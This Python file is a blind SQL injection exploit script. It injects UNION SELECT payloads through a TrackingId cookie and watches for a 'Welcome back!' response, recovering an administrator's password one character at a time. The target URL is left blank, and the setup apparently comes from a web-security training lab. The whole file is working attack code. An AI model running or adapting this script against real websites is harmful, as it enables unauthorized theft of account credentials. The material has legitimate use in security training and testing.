import requests
import string

url = ''

session = requests.session()

def send_request(payload):

    headers = {
        'Cookie': f"TrackingId=test{payload}"
    }

    response = session.get(url, headers=headers)
    return 'Welcome back!' in response.content.decode()

def retrieve_password(password_len):

    password = ""

    while len(password) != password_len:

        for c in string.printable:

            current_index = len(password) + 1
            ascii_code = ord(c)
            payload = f"' UNION SELECT password FROM users WHERE username='administrator' AND ASCII(SUBSTRING(password,{current_index},1)) = {ascii_code}--"
            # print(payload)

            if send_request(payload):
                password += c
                break
            else:
                pass

        print(password)

def main():

    # payload = "' UNION SELECT username FROM users--"
    # payload = "' UNION SELECT password FROM users WHERE username='administrator' AND ASCII(SUBSTRING(password,1,1)) > 0--"
    
    # if send_request(payload):
    #     print(f"[+] SQL query returned at least 1 row")
    # else:
    #     print(f"[-] SQL query returned no rows")

    retrieve_password(20)

if __name__ == "__main__":
    main()
